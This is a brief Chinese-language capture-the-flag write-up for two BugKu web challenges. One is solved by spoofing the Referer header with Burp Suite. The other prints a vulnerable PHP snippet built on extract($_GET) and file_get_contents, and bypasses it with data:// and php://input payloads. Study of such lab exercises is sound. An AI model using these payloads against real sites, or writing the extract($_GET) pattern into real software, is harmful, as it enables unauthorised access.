# BugKu

---

## 你从哪里来

> 修改请求头，从referer

![image-20240729174311534](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240729174311534-1722246194003-1.png)

采用BP抓包，修改`referer`

![image-20240729174422605](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240729174422605-1722246264310-3.png)

改为：www.google.com即可

## file_get_contents

一看到这个题目，就考虑到了PHP伪协议

```php
<?php
extract($_GET);
if (!empty($ac))
{
$f = trim(file_get_contents($fn));
if ($ac === $f)
{
echo "<p>This is flag:" ." $flag</p>";
}
else
{
echo "<p>sorry!</p>";
}
}
?>
```

### 方法一：

采用`data://`

```http
?ac=bugku&fn=data://text/plain,bugku
```

### 方法二：

采用`php://input` ,然后用hackbar，或者bp发送数据`bugku`

![image-20240729200512658](C:/Users/lenovo/Desktop/%E7%B4%A0%E6%9D%90%E5%BA%93/%E7%B4%A0%E6%9D%90/image-20240729200512658-1722254713852-5.png)

